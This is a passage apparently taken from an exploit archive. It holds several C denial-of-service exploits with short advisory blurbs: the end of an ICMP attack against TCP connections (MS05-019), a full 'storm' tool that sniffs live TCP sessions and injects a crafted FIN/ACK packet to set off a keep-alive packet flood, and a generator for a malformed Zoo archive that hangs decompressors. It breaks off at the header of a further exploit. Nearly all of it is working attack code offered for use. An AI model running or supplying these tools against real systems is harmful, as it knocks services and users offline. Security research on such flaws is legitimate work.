                                                       break;
                                               default:
                                                       usage(argv[0]);
                                                       break;
                                       }
                                       break;
                               case 't':
                                       switch (tolower(argv[i][2])) {
                                               case 'p':
                                                       if (strlen(argv[i]) > 4)
                                                       iToPort = atoi(&argv[i][4]);
                                                       break;
                                               case 'i':
                                                       if (strlen(argv[i]) > 4)
                                                       dwToIP = inet_addr(&argv[i][4]);
                                                       break;
                                               default:
                                                       usage(argv[0]);
                                                       break;
                                       }
                                       break;
                               case 'n':
                                       if (strlen(argv[i]) > 3)
                                       dwCount = atol(&argv[i][3]);
                                       break;
                               case 'a':
                                       if (strlen(argv[i]) > 3)
                                       Attack = atol(&argv[i][3]);
                                       if ((Attack > 3) || (Attack < 1))
                                       usage(argv[0]);
                                       break;
                               default:
                                       usage(argv[0]);
                                       break;
                       }
               }
       }
       return;
}

/*    This function calculates the 16-bit one's complement sum */
/*    for the supplied buffer */
unsigned short
checksum(unsigned short *buffer, int size)
{
       unsigned long cksum = 0;

       while (size > 1) {
               cksum += *buffer++;
               size  -= sizeof(unsigned short);
       }
       if (size) {
               cksum += *(unsigned char *)buffer;
       }
       cksum = (cksum >> 16) + (cksum & 0xffff);
       cksum += (cksum >>16);

       return (unsigned short)(~cksum);
}

int
main(int argc, char **argv)
{

#ifdef _WIN32
       WSADATA         wsd;
#endif
       int             s;
#ifdef _WIN32
       BOOL            bOpt;
#else
       int             bOpt;
#endif
       struct sockaddr_in remote;
       IP_HDR          ipHdr,
                       ipHdrInc;
       ICMP_HDR        icmpHdr;
       int             ret;
       unsigned long   i, p;
       unsigned short  iTotalSize,
                       iIPVersion,
                       iIPSize,
                       p2,
                       cksum = 0;
       char            buf[MAX_PACKET],
                       *ptr = NULL;
#ifdef _WIN32
       IN_ADDR         addr;
#else
       struct sockaddr_in addr;
#endif

       printf("\n               (MS05-019) (CISCO:20050412)\n");
       printf("       ICMP attacks against TCP (Proof-of-Concept)\n\n");
       printf("        Copyright (c) 2004-2005 .: houseofdabus :.\n\n\n");

       if (argc < 3) usage(argv[0]);

       /* Parse command line arguments and print them out */
       ValidateArgs(argc, argv);
#ifdef _WIN32
       addr.S_un.S_addr = dwFromIP;
       printf("[*] From IP: <%s>, port: %d\n", inet_ntoa(addr), iFromPort);
       addr.S_un.S_addr = dwToIP;
       printf("[*] To   IP: <%s>, port: %d\n", inet_ntoa(addr), iToPort);
       printf("[*] Count:   %d\n", dwCount);
#else
       addr.sin_addr.s_addr = dwFromIP;
       printf("[*] From IP: <%s>, port: %d\n", inet_ntoa(addr.sin_addr), iFromPort);
       addr.sin_addr.s_addr = dwToIP;
       printf("[*] To   IP: <%s>, port: %d\n", inet_ntoa(addr.sin_addr), iToPort);
       printf("[*] Count:   %d\n", dwCount);
#endif

#ifdef _WIN32
       if (WSAStartup(MAKEWORD(2,2), &wsd) != 0) {
               printf("[-] WSAStartup() failed: %d\n", GetLastError());
               return -1;
       }
#endif
       /*  Creating a raw socket */
       s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
#ifdef _WIN32
       if (s == INVALID_SOCKET) {
#else
       if (s < 0) {
#endif
               printf("[-] socket() failed\n");
               return -1;
       }

       /* Enable the IP header include option */
#ifdef _WIN32
       bOpt = TRUE;
#else
       bOpt = 1;
#endif
       ret = setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, sizeof(bOpt));
#ifdef _WIN32
       if (ret == SOCKET_ERROR) {
               printf("[-] setsockopt(IP_HDRINCL) failed: %d\n", WSAGetLastError());
               return -1;
       }
#endif

       /* Initalize the IP header */
       iTotalSize = sizeof(ipHdr) + sizeof(icmpHdr) + sizeof(msg)-1 + sizeof(ipHdrInc);

       iIPVersion = 4;
       iIPSize = sizeof(ipHdr) / sizeof(unsigned long);

       ipHdr.ip_verlen = (iIPVersion << 4) | iIPSize;
       ipHdr.ip_tos = 0;               /* IP type of service */
                                       /* Total packet len */
       ipHdr.ip_totallength = htons(iTotalSize);
       ipHdr.ip_id = htons(42451);     /* Unique identifier */
       ipHdr.ip_offset = 0;            /* Fragment offset field */
       ipHdr.ip_ttl = 255;             /* Time to live */
       ipHdr.ip_protocol = 0x1;        /* Protocol(ICMP) */
       ipHdr.ip_checksum = 0;          /* IP checksum */
       ipHdr.ip_srcaddr = dwFromIP;    /* Source address */
       ipHdr.ip_destaddr = dwToIP;     /* Destination address */

       ipHdrInc.ip_verlen = (iIPVersion << 4) | iIPSize;
       ipHdrInc.ip_tos = 0;            /* IP type of service */
                                       /* Total packet len */
       ipHdrInc.ip_totallength = htons(sizeof(ipHdrInc)+20);
       ipHdrInc.ip_id = htons(25068);  /* Unique identifier */

       ipHdrInc.ip_offset = 0;         /* Fragment offset field */
       ipHdrInc.ip_ttl = 255;          /* Time to live */
       ipHdrInc.ip_protocol = 0x6;     /* Protocol(TCP) */
       ipHdrInc.ip_checksum = 0;       /* IP checksum */
       ipHdrInc.ip_srcaddr = dwToIP;   /* Source address */
       ipHdrInc.ip_destaddr = dwFromIP;/* Destination address */

       /* Initalize the ICMP header */
       icmpHdr.checksum = 0;
       if (Attack == 1) {
               icmpHdr.type = 3;       /* Destination Unreachable Message */
               icmpHdr.code = 2;       /* protocol unreachable */
               icmpHdr.unused = 0;
       } else if (Attack == 2) {
               icmpHdr.type = 3;       /* Destination Unreachable Message */
               icmpHdr.code = 4;       /* fragmentation needed and DF set */
               icmpHdr.unused = 0x44000000; /* next-hop MTU - 68 */
       } else {
               icmpHdr.type = 4;       /* Source Quench Message */
               icmpHdr.code = 0;
               icmpHdr.unused = 0;
       }

       memset(buf, 0, MAX_PACKET);
       ptr = buf;

       memcpy(ptr, &ipHdr, sizeof(ipHdr));       ptr += sizeof(ipHdr);
       memcpy(ptr, &icmpHdr, sizeof(icmpHdr));   ptr += sizeof(icmpHdr);
       memcpy(ptr, &ipHdrInc, sizeof(ipHdrInc)); ptr += sizeof(ipHdrInc);
       memcpy(ptr, msg, sizeof(msg)-1);
       iFromPort = htons(iFromPort);
       memcpy(ptr, &iFromPort, 2);

       remote.sin_family = AF_INET;
       remote.sin_port = htons(iToPort);
       remote.sin_addr.s_addr = dwToIP;

       cksum = checksum((unsigned short *)&ipHdrInc, 20);
       memcpy(buf+20+sizeof(icmpHdr)+10, &cksum, 2);

       cksum = checksum((unsigned short *)&ipHdr, 20);
       memcpy(buf+10, &cksum, 2);

       for (p = iToPort; p <= 65535; p++) {
               p2 = htons((short)p);
               memcpy((char *)(ptr+2), &p2, 2);
               buf[22] = 0;
               buf[23] = 0;
               cksum = checksum((unsigned short *)(buf+20), sizeof(icmpHdr)+28);
               memcpy(buf+20+2, &cksum, 2);

               for (i = 0; i < dwCount; i++) {
#ifdef _WIN32
                       ret = sendto(s, buf, iTotalSize, 0, (SOCKADDR *)&remote,
                               sizeof(remote));
#else
                       ret = sendto(s, buf, iTotalSize, 0, (struct sockaddr *) &remote,
                       sizeof(remote));
#endif
#ifdef _WIN32
                       if (ret == SOCKET_ERROR) {
#else
                       if (ret < 0) {
#endif
                               printf("[-] sendto() failed\n");
                               break;
                       }
               }
       }

#ifdef _WIN32
       closesocket(s);
       WSACleanup();
#endif

       return 0;
}

// milw0rm.com [2005-04-20]
source: http://www.securityfocus.com/bid/13215/info

Multiple Vendor TCP/IP stack implementations are reported prone to a denial of service vulnerability.

A report indicates that the vulnerability manifests when an erroneous TCP acknowledgement number is encountered in an active TCP session stream.

A successful attack may result in a degradation of the target connection, effectively denying service for legitimate users. Additionally, reports indicate that the computer being attacked may suffer CPU performance degradation, potentially denying service for local users too. 

/*      Proof of Concept for exploiting the TCP Keep Alive implementation
*      2004/12/13
*
*      Antonio M. D. S. Fortes   - antoniofortes@inatel.br
*      Diego Prota Casati        - diego-casati@inatel.br
*      Leandro Spinola Rodrigues - leandro-rodrigues@inatel.br
*
*      Tested on:
*        Windows 98 SE
*        Windows NT Server 4.0
*        Windows 2000 Professional
*        Windows 2000 Server
*        Windows 2003 Server
*        Windows XP Professional Service Pack 1
*        Windows XP Professional Service Pack 2
*        Linux 2.4.x
*
*        Linux 2.6.x:
*          It wasnt tested but there is a probability that it will also work
*          on it.
*
*      Compile:
*        gcc -lpcap storm.c -o storm           [FreeBSD]
*        gcc -D LINUX storm.c -lpcap -o storm  [Linux]
*
*
*
*      How to use:
*        ./storm Device TargetHost [Count] [Filter]
*
*      Linux systems may need to get a copy of srtlcpy and strlcat
*      which can be downloaded from the
*      OpenBSD website (www.openbsd.org)
*
*      Example:
*        ./storm rl0 192.168.10.13 1 'dst port 80'
*
*        where [Count] stands for how many injected packets should be sent to
*        the host machine and [Filter] is the filter rules of the libpcap,
*        take a look in the tcpdump man pages for some enlightments.
*
*      Description:
*        This bug appeared during a few experimentations with the TCP/IP stack
*        after which we found out that it was not, at least it is not of our
*        knowledge, found anywhere else before. That was actually a Solaris bug
*        that resembles this one.
*
*        After an established connection, a specially crafted packet with the
*        ACK/FIN flags set, a corrected Sequency Number but with an incorrected
*        Acknowledge Number will trigger a massive flush of packages with zero
*        size and only the ACK flag set. Ethereal logs showed that the keep
*        alive state was occuring and this flow kept going for approximately 3
*        minutes and a few million packets. It was clearly observed that CPU
*        and network performance was severed decreased due to this misbehave.
*
*        Potential attacks includes  DoS and DDoS. Applications and services
*        that depends on quality of services (QoS) such as H323 applications
*        (VoIP) and video streamming will suffer dramatic performance
*        downgrade.
*
*      Thanks to:
*        Luiz Gustavo Torquato Vilela - aka "Neco" - for letting us
run few tests on his labs being such a reference
*        Everson da Silva Tavares - aka "ipfix" - for doing the Linux
compatibility
*        Rodrigo Rubira Branco - aka "BSDaemon" - for fixing some errors
*        Alex Marcio Ribeiro Nunes - aka Sefer_Zohar - for being a mentor
*        Flavio Neri Rodrigues - for giving us the basics of TCP/IP
that we needed
*
*      References:
*        RFC 793  - Transmission control protocol
*        RFC 1122 - Requirements for Internet Hosts - Communication Layers
*
*/

#ifdef LINUX
     #define _BSD_SOURCE
#endif

#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/ethernet.h>

#ifndef LINUX
     #include <net/bpf.h>
#else
     #include <bpf.h>
#endif

#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <pcap.h>

u_short StormCount, StormPosition = 0;
in_addr_t TargetAddress;

// Packet list
u_short PacketCount = 0;
#define PACKETS_MAX_COUNT 32
struct tcp_packet
{
     in_addr_t Source, Destination;
     u_short SourcePort, DestinationPort;
     u_short Length;
     uint32_t Acknowledge, Sequence;
     u_short Window;
     u_char Flags;
     struct tcp_packet *NextPacket;
} *PacketList = NULL;

// Function Prototypes
in_addr_t ResolveHost(char *Host);
u_short TCPCheckSum(in_addr_t Source, in_addr_t Destination, struct
tcphdr *TCP);
struct tcp_packet *AddPacket(in_addr_t Source, in_addr_t Destination,
u_short SourcePort, u_short DestinationPort, struct tcp_packet
*Packet);
void DeletePacket(struct tcp_packet *Packet);
struct tcp_packet *FindPacket(in_addr_t Source, in_addr_t Destination,
u_short SourcePort, u_short DestinationPort);
bool SendTCP(in_addr_t Source, in_addr_t Destination, u_short
SourcePort, u_short DestinationPort, uint32_t Acknowledge, uint32_t
Sequence, u_short Window, u_short Flags);
void PCapHandler(u_char *args, const struct pcap_pkthdr *pkthdr, const
u_char *packet);

int main(int argc, void **argv)
{
     // Length of each packet to capture
     const unsigned int PACKET_CAPTURE_LENGTH = sizeof(struct
ether_header) + sizeof(struct ip) + sizeof(struct tcphdr);

     char Device[16], TargetHost[128], Filter[512];
     bpf_u_int32 NetAddress, NetMask;
     char PCapError[PCAP_ERRBUF_SIZE];
     pcap_t *Descriptor;
     char CompleteFilter[1024];
     struct bpf_program Program;
     u_char *PCapNullArgs = NULL;

     if (argc < 3)
     {
           printf("Usage: %s Device TargetHost [Count] [Filter]\n", argv[0]);
           exit(1);
     }

#ifndef LINUX
     strlcpy(Device, argv[1], sizeof(Device));
     strlcpy(TargetHost, argv[2], sizeof(TargetHost));
#else
     strncpy(Device, argv[1], sizeof(Device));
     strncpy(TargetHost, argv[2], sizeof(TargetHost));
#endif
     TargetAddress = ResolveHost(TargetHost);

     // Getting network address and mask of the interface
     if (pcap_lookupnet(Device, &NetAddress, &NetMask, PCapError) == -1)
     {
           printf("pcap_lookupnet: %s\n", PCapError);
           printf("Error looking up network address and mask to
device %s\n", Device);
           exit(1);
     }
     if (argc >= 4)
           StormCount = atoi(argv[3]);
     else
           StormCount = 0;
     if (argc >= 5)
#ifndef LINUX
           strlcpy(Filter, argv[4], sizeof(Filter));
#else
           strncpy(Filter, argv[4], sizeof(Filter));
#endif
    else
           snprintf(Filter, sizeof(Filter), "net %s mask
%d.%d.%d.%d", inet_ntoa(*((struct in_addr *) &NetAddress)), ((u_char
*) &NetMask)[0], ((u_char *) &NetMask)[1], ((u_char *) &NetMask)[2],
((u_char *) &NetMask)[3]);

     // Obtaining a descriptor to look at packets on the network
    // Putting the interface in promiscuous mode
     Descriptor = pcap_open_live(Device, PACKET_CAPTURE_LENGTH, true,
1, PCapError);;
     if (Descriptor == NULL)
     {
           printf("pcap_open_live: %s\n", PCapError);
           printf("Error obtaining a descriptor to look at packets on
the network.\n");
          exit(1);
     }

    // Creating the filter string
     snprintf(CompleteFilter, sizeof(CompleteFilter), "tcp and (%s)", Filter);
     printf("Filter: %s\n", CompleteFilter);

     // Compiling the filter
    if (pcap_compile(Descriptor, &Program, CompleteFilter, false,
NetMask) == -1)
     {
           printf("pcap_compile: %s\n", pcap_geterr(Descriptor));
           printf("Filter: %s\n", Filter);
           printf("Error compiling the filter.\n");
           exit(1);
     }

     // Set the filter to the descriptor
     if (pcap_setfilter(Descriptor, &Program) == -1)
     {
           printf("pcap_setfilter: %s\n", pcap_geterr(Descriptor));
           printf("Error setting the filter.\n");
           exit(1);
     }

     // Main loop
     printf("Looking for an established tcp connection with %s
...\n", TargetHost);
     while (StormCount == 0 || StormPosition < StormCount)
           pcap_loop(Descriptor, 1, PCapHandler, PCapNullArgs);

     // The End
     printf("Finished!!!\n");

     return 0;
}

// Get the address of the host
in_addr_t ResolveHost(char *Host)
{
     in_addr_t Address = 0;
     struct hostent *HostEntity;

     if (strstr(".", Host) != NULL)
           inet_aton(Host, (struct in_addr *) &Address);
     else
     {
           HostEntity = gethostbyname(Host);
           if (HostEntity != NULL)
                 memcpy(&Address, HostEntity->h_addr, sizeof(in_addr_t));
     }
     return Address;
}

// Calculate a TCP packet checksum
u_short TCPCheckSum(in_addr_t Source, in_addr_t Destination, struct tcphdr *TCP)
{
     int CheckSum = 0;
     ushort Length = 2 * sizeof(in_addr_t) + sizeof(struct tcphdr);
     u_char *Packet = (u_char *) malloc(Length);
     u_short Index = 0;
     u_short *Buffer = (u_short *) Packet;
     uint16_t HeaderLength = htons(sizeof(struct tcphdr));

     if (Packet != NULL)
     {
           // Filling a temporary buffer to calculate the checksum
           memcpy(&Packet[Index], &Source, sizeof(Source));
           Index += sizeof(Source);
           memcpy(&Packet[Index], &Destination, sizeof(Destination));
           Index += sizeof(Destination);
           memcpy(&Packet[Index], TCP, sizeof(struct tcphdr));
           while (Length > 1)
           {
                 CheckSum += *Buffer++;
                 Length -= 2;
           }
           CheckSum += ntohs(IPPROTO_TCP + sizeof(struct tcphdr));
           if (Length == 1)
                 CheckSum += *((u_char *) Buffer);
           CheckSum = (CheckSum >> 16) + (CheckSum & 0xffff);
           CheckSum = (~(CheckSum + (CheckSum >> 16)) & 0xffff);
           free(Packet);
     }
     return CheckSum;
}

// Add a packet to the packet list
struct tcp_packet *AddPacket(in_addr_t Source, in_addr_t Destination,
u_short SourcePort, u_short DestinationPort, struct tcp_packet
*Packet)
{
     if (Packet == NULL)
     {
           if (PacketCount == 0)
           {
                 PacketList = (struct tcp_packet *)
malloc(sizeof(struct tcp_packet));
                 PacketList->NextPacket = NULL;
                 Packet = PacketList;
                 PacketCount++;
           }
           else if (PacketCount < PACKETS_MAX_COUNT)
           {
                 Packet = PacketList;
                 while (Packet->NextPacket != NULL)
                       Packet = Packet->NextPacket;
                 Packet->NextPacket = (struct tcp_packet *)
malloc(sizeof(struct tcp_packet));
                 Packet = Packet->NextPacket;
                 Packet->NextPacket = NULL;
                 PacketCount++;
           }
           else
           {
                 Packet = PacketList;
                 while (Packet->NextPacket != NULL)
                       Packet = Packet->NextPacket;
                 Packet->NextPacket = PacketList;
                 PacketList = PacketList->NextPacket;
                 Packet->NextPacket->NextPacket = NULL;
           }
     }

     if (Packet != NULL)
     {
           Packet->Source = Source;
           Packet->Destination = Destination;
           Packet->SourcePort = SourcePort;
           Packet->DestinationPort = DestinationPort;
           Packet->Length = 0;
           Packet->Acknowledge = 0;
           Packet->Sequence = 0;
           Packet->Window = 0;
           Packet->Flags = 0;
     }
     return Packet;
}

// Delete a packet from the packet list
void DeletePacket(struct tcp_packet *Packet)
{
     struct tcp_packet *CurrentPacket = PacketList;
     if (Packet != NULL && PacketCount > 0)
     {
           // Check for the first packet of the list
           if (Packet == PacketList)
           {
                 PacketList = PacketList->NextPacket;
                 free(Packet);
                 PacketCount--;
           }
           else
           {
                 // Try to find the packet in the list
                 while (CurrentPacket->NextPacket != Packet &&
CurrentPacket->NextPacket != NULL)
                       CurrentPacket = CurrentPacket->NextPacket;
                 if (CurrentPacket->NextPacket != NULL)
                 {
                       CurrentPacket->NextPacket =
CurrentPacket->NextPacket->NextPacket;
                       free(Packet);
                       PacketCount--;
                 }
           }
     }
}

// Search a packet that matches with source and destination addresses and ports
struct tcp_packet *FindPacket(in_addr_t Source, in_addr_t Destination,
u_short SourcePort, u_short DestinationPort)
{
     struct tcp_packet *PacketFound = NULL, *Packet = PacketList;
     u_short Index;
     for (Index = 0; Index < PacketCount; Index++)
     {
           if (Source == Packet->Source && Destination ==
Packet->Destination && SourcePort == Packet->SourcePort &&
DestinationPort == Packet->DestinationPort)
           {
                 PacketFound = Packet;
                 break;
           }
           Packet = Packet->NextPacket;
     }

     return PacketFound;
}

// Send a TCP packet
bool SendTCP(in_addr_t Source, in_addr_t Destination, u_short
SourcePort, u_short DestinationPort, uint32_t Acknowledge, uint32_t
Sequence, u_short Window, u_short Flags)
{
     bool Sent = false;
     int Socket;
     struct sockaddr_in SocketAddress;
     int On = 1;
     char Packet[sizeof(struct ip) + sizeof(struct tcphdr)];
     struct ip *IP = (struct ip *) &Packet[0];
     struct tcphdr *TCP = (struct tcphdr *) &Packet[sizeof(struct ip)];

     // Try to create a raw socket
     Socket = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
     if (Socket < 0)
           return false;

     // Configure the socket
     if(setsockopt(Socket, IPPROTO_IP, IP_HDRINCL, (char *) &On,
sizeof(On)) < 0)
     {
           close(Socket);
           return false;
     }

     // Configure the socket address
     memset(&SocketAddress, 0, sizeof(SocketAddress));
#ifndef LINUX
     SocketAddress.sin_len = sizeof(Packet);
#endif
     SocketAddress.sin_family = AF_INET;
     SocketAddress.sin_port = DestinationPort;
     SocketAddress.sin_addr.s_addr = Destination;

     // Fill the packet
     memset(Packet, 0, sizeof(Packet));
     IP->ip_hl = sizeof(struct ip) >> 2;
     IP->ip_v = 4;
     IP->ip_len = sizeof(Packet);
     IP->ip_ttl = 64;
     IP->ip_p = IPPROTO_TCP;
     IP->ip_src.s_addr = Source;
     IP->ip_dst.s_addr = Destination;

     TCP->th_sport = SourcePort;
     TCP->th_dport = DestinationPort;
     TCP->th_ack = Acknowledge;
     TCP->th_seq = Sequence;
     TCP->th_off = sizeof(struct tcphdr) >> 2;
#if BYTE_ORDER == LITLE_ENDIAN
     TCP->th_off = TCP->th_off << 4;
#endif
     TCP->th_flags = Flags;
     TCP->th_win = Window;
     TCP->th_sum = TCPCheckSum(Source, Destination, TCP);

     // Try to send the packet
     Sent = sendto(Socket, Packet, sizeof(Packet), 0, (const struct
sockaddr *) &SocketAddress, sizeof(SocketAddress)) == sizeof(Packet);
     if (!Sent)
     {
           printf("Error sending packet to %s ...\n",
inet_ntoa(*((struct in_addr *) &Destination)));
     }

     close(Socket);
     return Sent;
}

// Packet Capture handler
void PCapHandler(u_char *args, const struct pcap_pkthdr *pkthdr, const
u_char *packet)
{
     struct ip *IP = (struct ip *) &packet[sizeof(struct ether_header)];
     struct tcphdr *TCP = (struct tcpheader *) &packet[sizeof(struct
ether_header) + sizeof(struct ip)];
     char Source[16], Destination[16];
     u_short Length;
     struct tcp_packet *Packet, *PreviousPacket, *TargetPacket, *ReturnPacket;
     bool DeletePackets = false, KeepAlive = false, StormSent = false;
     char PacketType[32];

#ifndef LINUX
     strlcpy(PacketType, ". . . . . .", sizeof(PacketType));

     // Getting the Source and Destination ASCII strings
     strlcpy(Source, (char *) inet_ntoa(IP->ip_src), sizeof(Source));
     strlcpy(Destination, (char *) inet_ntoa(IP->ip_dst), sizeof(Destination));
#else
     strncpy(PacketType, ". . . . . .", sizeof(PacketType));

     // Getting the Source and Destination ASCII strings
     strncpy(Source, (char *) inet_ntoa(IP->ip_src), sizeof(Source));
     strncpy(Destination, (char *) inet_ntoa(IP->ip_dst), sizeof(Destination));
#endif

     // Length of the TCP data
     Length = pkthdr->len - sizeof(struct ether_header) -
sizeof(struct ip) - (TCP->th_off << 2);

     // Search for a packet in the list, with the same source, destination,
     // source port and destination port of the packet received
     Packet = FindPacket(IP->ip_src.s_addr, IP->ip_dst.s_addr,
TCP->th_sport, TCP->th_dport);
     PreviousPacket = FindPacket(IP->ip_dst.s_addr,
IP->ip_src.s_addr, TCP->th_dport, TCP->th_sport);

     // Check for flags in an established connection
     if ((TCP->th_flags & TH_ACK) && !(TCP->th_flags & (TH_FIN | TH_RST)))
     {
           // Add the packet to the list
           Packet = AddPacket(IP->ip_src.s_addr, IP->ip_dst.s_addr,
TCP->th_sport, TCP->th_dport, Packet);

           // Fill important data in the packet added
           // The TCP header size includes the size of the TCP options
           Packet->Length = Length;
           Packet->Acknowledge = TCP->th_ack;
           Packet->Sequence = TCP->th_seq;
           Packet->Window = TCP->th_win;
           Packet->Flags = TCP->th_flags;

           if (PreviousPacket != NULL)
           {
                 // Check if the packet is a keep alive one
                 KeepAlive = (Packet->Flags == TH_ACK) &&
(Packet->Length == 0) && (PreviousPacket->Flags == TH_ACK) &&
(PreviousPacket->Length == 0);

                 // Check target address again (Possible invalid filter)
                 if (!KeepAlive && (Packet->Destination ==
TargetAddress || PreviousPacket->Destination == TargetAddress))
                 {
                       // Established connection detected
#ifndef LINUX
                       strlcpy(PacketType, "Established", sizeof(PacketType));
#else
                       strncpy(PacketType, "Established", sizeof(PacketType));
#endif

                       // Point TargetPacket to the packet that has
                       // destination matching with target address,
                       // and ReturnPacket to the other
                       if (Packet->Destination == TargetAddress)
                       {
                             TargetPacket = Packet;
                             ReturnPacket = PreviousPacket;
                       }
                       else
                       {
                            TargetPacket = PreviousPacket;
                             ReturnPacket = Packet;
                       }

                       // Send the malicious TCP packet to start the
                       // storm;
                       // The Acknowledge Number is guaranteed to
                       // be less or equal to the expected Acknowledge
                       // Number minus 1 (This is what we want! ;) )
                       StormSent = SendTCP(TargetPacket->Source,
TargetPacket->Destination, TargetPacket->SourcePort,
TargetPacket->DestinationPort, htonl(ntohl(TargetPacket->Acknowledge)
- 1), htonl(ntohl(ReturnPacket->Acknowledge) + (TargetPacket->Flags &
TH_SYN) / TH_SYN), TargetPacket->Window, TH_FIN | TH_ACK);
                 }
           }
     }
     else
     {
           DeletePackets = true;
#ifndef LINUX
           strlcpy(PacketType, "Closed.....", sizeof(PacketType));
#else
           strncpy(PacketType, "Closed.....", sizeof(PacketType));
#endif
     }

     // Print some information of the packet received
     if (!KeepAlive)
           printf("%s: [Length: %d] %s.%d %s.%d\n", PacketType,
Length, Source, ntohs(TCP->th_sport), Destination,
ntohs(TCP->th_dport));

     if (StormSent)
     {
           StormPosition++;
           printf("** STORM **: [Packet %d] Sent to %s.%d\n",
		   StormPosition, inet_ntoa(*((struct in_addr *)
		   &TargetPacket->Destination)), ntohs(TargetPacket->DestinationPort));
     }

     if (DeletePackets)
     {
           // Delete this packet (if it is in the list) and a possible
           // previous packet, in the oposite way
           DeletePacket(Packet);
           DeletePacket(PreviousPacket);
     }
}

source: http://www.securityfocus.com/bid/23823/info

The Zoo compression algorithm is prone to a remote denial-of-service vulnerability. This issue arises when applications implementing the Zoo algorithm process certain malformed archives.

A successful attack can exhaust system resources and trigger a denial-of-service condition.

This issue affects Zoo 2.10 and other applications implementing the vulnerable algorithm.

/*

Exploit for the vulnerability:
Multiple vendors ZOO file decompression infinite loop DoS

coded by Jean-S�bastien Guay-Leroux
September 2006

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Structure of a ZOO header

#define ZOO_HEADER_SIZE         0x0000002a

#define ZH_TEXT                 0
#define ZH_TAG                  20
#define ZH_START_OFFSET         24
#define ZH_NEG_START_OFFSET     28
#define ZH_MAJ_VER              32
#define ZH_MIN_VER              33
#define ZH_ARC_HTYPE            34
#define ZH_ARC_COMMENT          35
#define ZH_ARC_COMMENT_LENGTH   39
#define ZH_VERSION_DATA         41


#define D_DIRENTRY_LENGTH       56

#define D_TAG                   0
#define D_TYPE                  4
#define D_PACKING_METHOD        5
#define D_NEXT_ENTRY            6
#define D_OFFSET                10
#define D_DATE                  14
#define D_TIME                  16
#define D_FILE_CRC              18
#define D_ORIGINAL_SIZE         20
#define D_SIZE_NOW              24
#define D_MAJ_VER               28
#define D_MIN_VER               29
#define D_DELETED               30
#define D_FILE_STRUCT           31
#define D_COMMENT_OFFSET        32
#define D_COMMENT_SIZE          36
#define D_FILENAME              38
#define D_VAR_DIR_LEN           51
#define D_TIMEZONE              53
#define D_DIR_CRC               54
#define D_NAMLEN                ( D_DIRENTRY_LENGTH + 0 )
#define D_DIRLEN                ( D_DIRENTRY_LENGTH + 1 )
#define D_LFILENAME             ( D_DIRENTRY_LENGTH + 2 )


void put_byte (char *ptr, unsigned char data) {
        *ptr = data;
}

void put_word (char *ptr, unsigned short data) {
        put_byte (ptr, data);
        put_byte (ptr + 1, data >> 8);
}

void put_longword (char *ptr, unsigned long data) {
        put_byte (ptr, data);
        put_byte (ptr + 1, data >> 8);
        put_byte (ptr + 2, data >> 16);
        put_byte (ptr + 3, data >> 24);
}

FILE * open_file (char *filename) {

        FILE *fp;

        fp = fopen ( filename , "w" );

        if (!fp) {
                perror ("Cant open file");
                exit (1);
        }

        return fp;
}

void usage (char *progname) {

        printf ("\nTo use:\n");
        printf ("%s <archive name>\n\n", progname);

        exit (1);
}

int main (int argc, char *argv[]) {
        FILE *fp;
        char *hdr = (char *) malloc (4096);
        char *filename = (char *) malloc (256);
        int written_bytes;
      int total_size;

        if ( argc != 2) {
                usage ( argv[0] );
        }

        strncpy (filename, argv[1], 255);

        if (!hdr || !filename) {
                perror ("Error allocating memory");
                exit (1);
        }

        memset (hdr, 0x00, 4096);

        // Build a ZOO header
        memcpy          (hdr + ZH_TEXT, "ZOO 2.10 Archive.\032", 18);
        put_longword    (hdr + ZH_TAG, 0xfdc4a7dc);
        put_longword    (hdr + ZH_START_OFFSET, ZOO_HEADER_SIZE);
        put_longword    (hdr + ZH_NEG_START_OFFSET,
            (ZOO_HEADER_SIZE) * -1);
        put_byte        (hdr + ZH_MAJ_VER, 2);
        put_byte        (hdr + ZH_MIN_VER, 0);
        put_byte        (hdr + ZH_ARC_HTYPE, 1);
        put_longword    (hdr + ZH_ARC_COMMENT, 0);
        put_word        (hdr + ZH_ARC_COMMENT_LENGTH, 0);
        put_byte        (hdr + ZH_VERSION_DATA, 3);

        // Build vulnerable direntry struct
        put_longword    (hdr + ZOO_HEADER_SIZE + D_TAG, 0xfdc4a7dc);
        put_byte        (hdr + ZOO_HEADER_SIZE + D_TYPE, 1);
        put_byte        (hdr + ZOO_HEADER_SIZE + D_PACKING_METHOD, 0);
        put_longword    (hdr + ZOO_HEADER_SIZE + D_NEXT_ENTRY, 0x2a);
        put_longword    (hdr + ZOO_HEADER_SIZE + D_OFFSET, 0x71);
        put_word        (hdr + ZOO_HEADER_SIZE + D_DATE, 0x3394);
        put_word        (hdr + ZOO_HEADER_SIZE + D_TIME, 0x4650);
        put_word        (hdr + ZOO_HEADER_SIZE + D_FILE_CRC, 0);
        put_longword    (hdr + ZOO_HEADER_SIZE + D_ORIGINAL_SIZE, 0);
        put_longword    (hdr + ZOO_HEADER_SIZE + D_SIZE_NOW, 0);
        put_byte        (hdr + ZOO_HEADER_SIZE + D_MAJ_VER, 1);
        put_byte        (hdr + ZOO_HEADER_SIZE + D_MIN_VER, 0);
        put_byte        (hdr + ZOO_HEADER_SIZE + D_DELETED, 0);
        put_byte        (hdr + ZOO_HEADER_SIZE + D_FILE_STRUCT, 0);
        put_longword    (hdr + ZOO_HEADER_SIZE + D_COMMENT_OFFSET, 0);
        put_word        (hdr + ZOO_HEADER_SIZE + D_COMMENT_SIZE, 0);
        memcpy          (hdr + ZOO_HEADER_SIZE + D_FILENAME,
                            "AAAAAAAA.AAA", 13);

        total_size = ZOO_HEADER_SIZE + 51;

        fp = open_file (filename);

        if ( (written_bytes = fwrite ( hdr, 1, total_size, fp)) != 0 ) {
                printf ("The file has been written\n");
        } else {
                printf ("Cant write to the file\n");
                exit (1);
        }

        fclose (fp);

        return 0;
}

/*
  by Luigi Auriemma
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <openssl/ssl.h>    // link with libssl.a libcrypto.a -lgdi32

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

